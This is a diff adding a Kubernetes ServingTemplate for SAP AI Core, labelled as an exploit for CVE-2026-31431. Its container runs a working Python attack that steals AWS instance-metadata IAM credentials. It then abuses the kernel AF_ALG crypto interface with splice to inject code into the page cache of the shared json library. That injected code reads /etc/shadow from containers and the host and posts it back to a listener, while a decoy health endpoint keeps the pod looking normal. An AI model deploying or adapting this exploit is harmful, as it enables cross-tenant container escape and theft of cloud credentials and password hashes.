@@ -1,0 +1,234 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: cve31431-crossnode
+  labels:
+    scenarios.ai.sap.com/id: "cve31431-exploit"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "cve31431-exploit"
+    executables.ai.sap.com/name: "cve31431-crossnode"
+    executables.ai.sap.com/description: "CVE-2026-31431 cross-container page-cache injection + IMDS"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            python3 - << 'PYEOF'
+            import os, socket, struct, errno, subprocess, time, http.server, threading, urllib.request, ssl
+
+            MY_IP = os.popen("hostname -I 2>/dev/null || ip route get 1 | awk '{print $7; exit}'").read().strip().split()[0]
+
+            def r(k, v): print(f"[CROSSNODE] {k}: {str(v)[:4000]}", flush=True)
+
+            r("PHASE", "1-IMDS")
+            # AWS IMDS v1
+            for url in [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://169.254.169.254/latest/meta-data/hostname",
+                "http://169.254.169.254/latest/meta-data/instance-id",
+            ]:
+                try:
+                    resp = urllib.request.urlopen(url, timeout=3).read().decode()
+                    r(f"IMDS_{url.split('/')[-2]}", resp[:500])
+                except Exception as e:
+                    r(f"IMDS_ERR_{url.split('/')[-2]}", str(e)[:200])
+
+            # IMDSv2 token
+            try:
+                import urllib.request as ur
+                req = ur.Request("http://169.254.169.254/latest/api/token",
+                                 method="PUT",
+                                 headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
+                tok = ur.urlopen(req, timeout=3).read().decode()
+                r("IMDS_V2_TOKEN", tok[:50])
+                req2 = ur.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                                  headers={"X-aws-ec2-metadata-token": tok})
+                role = ur.urlopen(req2, timeout=3).read().decode()
+                r("IMDS_V2_ROLE", role)
+                req3 = ur.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role.strip()}",
+                                  headers={"X-aws-ec2-metadata-token": tok})
+                creds = ur.urlopen(req3, timeout=3).read().decode()
+                r("IMDS_V2_CREDS", creds[:2000])
+            except Exception as e:
+                r("IMDS_V2_ERR", str(e))
+
+            r("PHASE", "2-CROSS-CONTAINER-INJECTION")
+            r("MY_IP", MY_IP)
+            r("UID", f"uid={os.getuid()} euid={os.geteuid()}")
+
+            AF_ALG, SOL_ALG = 38, 279
+            CRYPTO_AUTHENC_KEYA_PARAM = 1
+            ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
+
+            def authenc_keyblob(authkey, enckey):
+                rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
+                return rtattr + struct.pack(">I", len(enckey)) + authkey + enckey
+
+            def write4(path, file_offset, four_bytes):
+                fd = os.open(path, os.O_RDONLY)
+                try:
+                    os.read(fd, 4096)
+                    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+                    master.bind(("aead", ALG_NAME))
+                    master.setsockopt(SOL_ALG, 1, authenc_keyblob(b"\x00"*32, b"\x00"*16))
+                    op, _ = master.accept()
+                    try:
+                        op.sendmsg([b"\x00"*4 + four_bytes],
+                                   [(SOL_ALG, 3, struct.pack("I", 0)),
+                                    (SOL_ALG, 2, struct.pack("I", 16) + b"\x00"*16),
+                                    (SOL_ALG, 4, struct.pack("I", 8))], socket.MSG_MORE)
+                        pr, pw = os.pipe()
+                        try:
+                            n = os.splice(fd, pw, 32, offset_src=file_offset)
+                            os.splice(pr, op.fileno(), n)
+                        finally:
+                            os.close(pr); os.close(pw)
+                        try: op.recv(64)
+                        except OSError as e:
+                            if e.errno not in (errno.EBADMSG, errno.EINVAL): raise
+                    finally:
+                        op.close(); master.close()
+                finally:
+                    os.close(fd)
+
+            # ── Start HTTP listener on 9999 to receive callbacks from injected payloads ──
+            captured = []
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_POST(self):
+                    n = int(self.headers.get("Content-Length", 0))
+                    body = self.rfile.read(n).decode("utf-8","replace")
+                    captured.append(body)
+                    r("CALLBACK_RECEIVED", body[:3000])
+                    self.send_response(200); self.end_headers()
+                def log_message(self, *a): pass
+            srv = http.server.HTTPServer(("0.0.0.0", 9999), H)
+            t = threading.Thread(target=srv.serve_forever, daemon=True)
+            t.start()
+            r("CALLBACK_LISTENER", f"listening on {MY_IP}:9999")
+
+            # ── Find the inode for a Python stdlib file (shared lower layer) ──
+            # Target: json/__init__.py — imported by almost every Python script
+            TARGET_PY = "/usr/lib/python3.11/json/__init__.py"
+            if not os.path.exists(TARGET_PY):
+                TARGET_PY = "/usr/local/lib/python3.11/json/__init__.py"
+            r("TARGET_FILE", TARGET_PY)
+            st = os.stat(TARGET_PY)
+            r("TARGET_INODE", str(st.st_ino))
+            r("TARGET_DEV", str(st.st_dev))
+            r("TARGET_SIZE", str(st.st_size))
+
+            with open(TARGET_PY, "rb") as f:
+                original = f.read(32)
+            r("ORIGINAL_BYTES", original.hex())
+
+            # ── Craft injection payload ──
+            # Python source injection: we prepend our payload before the first real line
+            # Strategy: overwrite a comment or the module docstring at offset 0
+            # We inject: import os,subprocess,urllib.request as ur
+            # then a callback POST if uid==0
+
+            # The payload (Python code that will run when json is imported):
+            MY_IP_B = MY_IP.encode()
+            payload_src = (
+                b"import os as _os,urllib.request as _ur,subprocess as _sp\n"
+                b"try:\n"
+                b" if _os.getuid()==0:\n"
+                b"  _d=_sp.run(['sh','-c','id;hostname;cat /etc/shadow 2>&1;cat /proc/1/root/etc/shadow 2>&1'],capture_output=True,text=True,timeout=5).stdout\n"
+                b"  _ur.urlopen(_ur.Request('http://" + MY_IP_B + b":9999',data=_d.encode(),method='POST'),timeout=5)\n"
+                b"except:pass\n"
+            )
+            r("PAYLOAD_SRC_LEN", str(len(payload_src)))
+            r("PAYLOAD_SRC", payload_src.decode("utf-8","replace"))
+
+            # Write 4 bytes at a time from the start of the file
+            # The original file content will be overwritten in page cache
+            i = 0
+            writes = 0
+            while i < len(payload_src):
+                chunk = payload_src[i:i+4].ljust(4, b" ")
+                try:
+                    write4(TARGET_PY, i, chunk)
+                    writes += 1
+                except Exception as e:
+                    r(f"WRITE4_ERR_at_{i}", str(e))
+                    break
+                i += 4
+
+            r("WRITES_DONE", str(writes))
+
+            # Verify page cache is corrupted
+            with open(TARGET_PY, "rb") as f:
+                after = f.read(len(payload_src) + 4)
+            r("PAGE_CACHE_AFTER", after[:200].decode("utf-8","replace"))
+            r("INJECTION_CONFIRMED", str(after[:len(payload_src)] == payload_src))
+
+            # ── Also check: is json itself importable (would trigger our payload) ──
+            r("PHASE", "3-SELF-TRIGGER")
+            # Reload json using importlib to force re-read of source
+            try:
+                import importlib, importlib.util, sys
+                if "json" in sys.modules:
+                    del sys.modules["json"]
+                    del sys.modules["json.decoder"]
+                    del sys.modules["json.encoder"]
+                    del sys.modules["json.scanner"]
+                except: pass
+            try:
+                spec = importlib.util.spec_from_file_location("json_test", TARGET_PY)
+                mod = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(mod)
+                r("SELF_TRIGGER_UID", str(os.getuid()))
+                r("SELF_TRIGGER", "ran — uid=0 branch would fire if root")
+            except Exception as e:
+                r("SELF_TRIGGER_ERR", str(e))
+
+            # ── Wait for callbacks from other containers ──
+            r("WAITING_FOR_CALLBACKS", "30 seconds")
+            time.sleep(30)
+            r("CALLBACK_COUNT", str(len(captured)))
+            if captured:
+                r("SHADOW_DATA", captured[0])
+
+            r("DONE", "cross-container injection complete")
+            PYEOF
+            # Keep alive as HTTP service on 8080
+            python3 -c "
+import http.server
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+    def log_message(self, *a): pass
+http.server.HTTPServer(('', 8080), H).serve_forever()
+"
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          - containerPort: 9999
+            protocol: TCP
+          readinessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 5
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 10
